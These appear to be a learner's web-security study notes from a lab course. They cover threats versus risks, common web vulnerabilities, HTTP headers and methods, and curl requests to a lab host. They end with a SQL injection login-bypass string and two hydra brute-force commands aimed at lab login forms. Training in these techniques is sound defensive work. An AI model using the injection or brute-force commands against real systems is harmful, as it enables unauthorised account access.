Threats vs Risks

<h1>Threats</h1> 
Potential source of harm or adverse event that may exploit a vulnerability in system.
Human-Made such as cyber criminals, hackers, or insiders with malicious intent or they can be natural such as floods, earthquakes or power outages.
malicious infections , phishing attempts.

<h1>Risks</h1>
Potential for a loss or harm resulting from a threat exploitation a vulnerability in a system. Combination of likelihood or probability of threat occurrence and the impact

XSS 
SQLi
CSRF
Security Misconfiguration
Sensitive Data Exposure 
Brute-Force and Credentials Stuffing Attack
File Upload Vulnerability
DoS or DDoS
SSRF
Inadequate Access Control
Using components with Known Vulnerability
Broken Access Control



<h1>HTTP request</h1>
User-Agent: Information about the client making the request 
Host: The hostname of the server.
Accept: The media types the client can handle in the response 
Authorisation: Credentials for authentication, if required.
Cookie: Information stored on the client-side and sent back to the server with each request.

GET : to retrieve data from the server.
POST : submit data to be processed by the server.
PUT : update or create a resource on the server at specified URL.
DELETE : remove the resource specified by the URL.
PATCH : partial modifications to a resource.
HEAD : to retrieves the response headers and not the response body
OPTIONS : to retrieve information about the communication options available for the target resource.

curl -v -X OPTIONS http://demo.ine.local
curl -v -X GET http://demo.ine.local
curl -v -X POST http://demo.ine.local/login -d "username=test&password=test" 
HTTP + SSL/TLS = HTTPS

crawling the process of navigating around the web application.
spidering the process of automatically discovering new resources (URLs) in the web application.

a threat vector refers to the method or means by which a cyber threat or attack is introduced to a target system or network.

'OR'1'='1';--
meow

	hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
	-P /root/Desktop/wordlists/100-common-passwords.txt \
	target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
      

	hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
	target2.ine.local http-post-form "/login:username=^USER^:F=incorrect"